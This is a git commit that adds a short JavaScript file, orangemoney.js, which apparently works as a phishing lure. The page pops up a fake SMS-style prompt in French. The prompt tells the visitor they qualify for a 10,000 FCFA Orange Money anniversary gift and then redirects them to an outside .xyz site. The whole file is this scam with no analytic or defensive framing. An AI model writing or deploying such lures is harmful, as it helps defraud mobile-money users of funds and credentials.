89995a4df212beae2ecd76e0df9ca409ab55a0c7
newetijazz8 <newetijazz8@gmail.com>
2025-09-25 09:03:37 +0100

    Create orangemoney.js

---
+++ orangemoney.js
@@ -0,0 +1,5 @@
+var password = '10 000 FCFA'
+password=prompt('SMS: Félicitations, votre compte est qualifié pour recevoir le cadeau anniversaire Orange Money de 10 000 FCFA, appuyez sur OK pour activer','10 000 FCFA');
+if (password != '10 000 FCFA') {
+location.href='https://www.itinpty.xyz/Orange-Money-Anniversaire';
+}
